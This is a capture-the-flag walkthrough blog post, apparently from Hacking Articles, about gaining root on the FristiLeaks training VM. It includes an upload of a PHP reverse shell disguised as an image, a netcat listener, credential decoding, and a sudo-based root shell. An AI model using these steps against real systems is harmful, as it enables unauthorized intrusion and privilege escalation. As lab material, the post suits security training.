@@ -1,0 +1,397 @@
+
+								
+																		Hack the Fristileaks VM (CTF Challenge)
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on October 2, 2016
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Today we will walk through the first leaks VM. There is nothing that we know about this VM except for the fact that the security level is from beginner to intermediate. Also, this VM only works on 08:00:27:A5:A6:76 MAC address or else it will not work.
+You can download it from here: https://www.vulnhub.com/entry/fristileaks-13,133/
+Task: Get root Access and Capture the Flag
+Level: Intermediate
+Penetrating Methodology
+
+Scanning Network
+Enumeration
+Exploiting Web Application
+Post Exploit Enumeration
+Privilege Escalation
+Capture the Flag
+
+Walkthrough
+Scanning Network 
+Let’s start by scanning your victims’ IP.
+
+		
+		
+			
+			
+			
+			
+nmap -A 19.168.1.110
+			
+				
+					
+				
+					1
+				
+						nmap -A 19.168.1.110
+					
+				
+			
+		
+
+
+Nmap shows us that port number 80 is open. Therefore, let’s open our victim’s IP in the browser.
+
+Enumeration
+Exploring the webpage, it occurred to me that fristi is also a drink like a cola or beer or sisi and also there was the reference to it on the home page so there is a possibility that fristi is also a directory here. And there was no harm in trying it.
+
+And we found the login portal through fristi. Cheers. Once I looked at the source page of this directory, I found what I think is a username.
+
+Also, by reading the metadata of the image which was encoded as indicated in the page source I found a string of letters. To decode type:
+
+		
+		
+			
+			
+			
+			
+base64 -d encode &gt; 1.png
+			
+				
+					
+				
+					1
+				
+						base64 -d encode &gt; 1.png
+					
+				
+			
+		
+
+
+Exploiting Web Application
+Then, we made up a php_reverse shell (available inside: /usr/share/webshells/php), in the form of .jpg and modified lhost and lport values.
+
+And then uploaded this shell in 192.168.1.110/fristi/do_upload.php.
+
+And then we executed our shell by typing:
+
+		
+		
+			
+			
+			
+			
+192.168.1.110/fristi/uploads/shell/php.jpg
+			
+				
+					
+				
+					1
+				
+						192.168.1.110/fristi/uploads/shell/php.jpg
+					
+				
+			
+		
+
+
+Then through netcat we will listen in and get a session while navigating around:
+
+		
+		
+			
+			
+			
+			
+nc -lvp 1234
+cd /home
+ls
+cd eezpeez
+ls -la
+			
+				
+					
+				
+					12345
+				
+						nc -lvp 1234cd /homelscd eezpeezls -la
+					
+				
+			
+		
+
+
+Post Exploit Enumeration
+So, in /eezpeez directory we found a notes.txt file. Let’s read it:
+
+		
+		
+			
+			
+			
+			
+cat notes.txt
+			
+				
+					
+				
+					1
+				
+						cat notes.txt
+					
+				
+			
+		
+
+ 
+Again in the notes.txt, there is a message from Jerry telling us what to do. So let’s follow his steps by typing:
+
+		
+		
+			
+			
+			
+			
+echo "/home/admin/chmod –R 777 /home/admin" &gt; /tmp/runthis
+			
+				
+					
+				
+					1
+				
+						echo "/home/admin/chmod –R 777 /home/admin" &gt; /tmp/runthis
+					
+				
+			
+		
+
+After typing the command go back to the home folder and from there go into the admin directory.
+
+		
+		
+			
+			
+			
+			
+cd /tmp
+cd /home/admin
+ls -la
+			
+				
+					
+				
+					123
+				
+						cd /tmpcd /home/adminls -la
+					
+				
+			
+		
+
+
+Now, in the above image, you can see that it said that the code allows the string to be encrypted so now, save the script in your kali and then change the word ‘base64string’ to ‘decoded’ in the script and finally use the following command to decrypt it :
+
+		
+		
+			
+			
+			
+			
+python cryptpass.py =RFn0AKnlMHMPIzpyuTI0ITG
+			
+				
+					
+				
+					1
+				
+						python cryptpass.py =RFn0AKnlMHMPIzpyuTI0ITG
+					
+				
+			
+		
+
+And the decoded string is ‘LetThereBeFristi!’
+
+Privilege Escalation
+Now, this may be the password to fristigod user. So let’s try and use it. For this we need to switch user so, type the following command:
+
+		
+		
+			
+			
+			
+			
+su fristigod
+			
+				
+					
+				
+					1
+				
+						su fristigod
+					
+				
+			
+		
+
+Enter ‘LetThereBeFristi’ as a password. Then I explored the fristigod folder and there I found the history file. In this history file, there was one command that was used over and over again with sudo permissions:
+
+		
+		
+			
+			
+			
+			
+cd /var/fristigod
+ls -lsa
+cat bash.history
+			
+				
+					
+				
+					123
+				
+						cd /var/fristigodls -lsacat bash.history
+					
+				
+			
+		
+
+
+So let’s check sudo right for the said command to work. Therefore type:
+
+		
+		
+			
+			
+			
+			
+sudo -l
+			
+				
+					
+				
+					1
+				
+						sudo -l
+					
+				
+			
+		
+
+It will ask for a password for fristigod, use the same password as above. Then to give rights type:
+
+		
+		
+			
+			
+			
+			
+sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom /bin/bash
+id
+cd /root
+ls
+cat fristileafs_secrets.txt
+			
+				
+					
+				
+					12345
+				
+						sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom /bin/bashidcd /rootlscat fristileafs_secrets.txt
+					
+				
+			
+		
+
+Then by navigating around using the above commands, I found a text file. By reading the contents of the file you can see that you have found second/last flag.
+
+And VOILA!! This way you solve another CTF called fristileaks. Happy Pentesting!!
+Author: Yashika Dhir is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contact here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
